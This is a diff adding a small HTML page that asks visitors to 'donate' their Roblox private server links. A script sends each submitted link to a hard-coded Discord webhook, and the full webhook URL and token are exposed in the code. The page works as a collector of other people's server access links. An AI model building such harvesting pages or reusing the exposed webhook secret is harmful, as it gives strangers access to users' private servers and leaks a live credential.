@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Moreira Method</title>
+  <style>
+    body {
+      background-color: #0b0b0b;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+    .box {
+      width: 600px;
+      margin: 80px auto;
+      padding: 25px;
+      border: 1px solid #333;
+      border-radius: 8px;
+      background: #111;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background: #1a1a1a;
+      color: white;
+      border: 1px solid #333;
+      border-radius: 4px;
+    }
+    button {
+      cursor: pointer;
+      background: #222;
+    }
+    button:hover {
+      background: #333;
+    }
+    .success {
+      color: #00ff99;
+      margin-top: 15px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <h2>Contributing</h2>
+    <p>Share your Roblox VIP Server link below.</p>
+
+    <input id="psLink" placeholder="https://www.roblox.com/games/...privateServerLinkCode=XXXX">
+
+    <button onclick="send()">Donate</button>
+
+    <p class="success" id="successText">✅ Join ur private servers</p>
+  </div>
+
+  <script>
+    function send() {
+      const link = document.getElementById("psLink").value;
+      if (!link) return alert("Enter a valid link");
+
+      fetch("https://discord.com/api/webhooks/1452873894682824777/6zrnDuILFSv3skLD4gff5B5ZC4uDo_no_jMo86jaRocJampAzjZPBO2l6gRqHlZS_hHh", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          content: "🔗 New Private Server:\n" + link
+        })
+      });
+
+      document.getElementById("successText").style.display = "block";
+    }
+  </script>
+
+</body>
+</html>
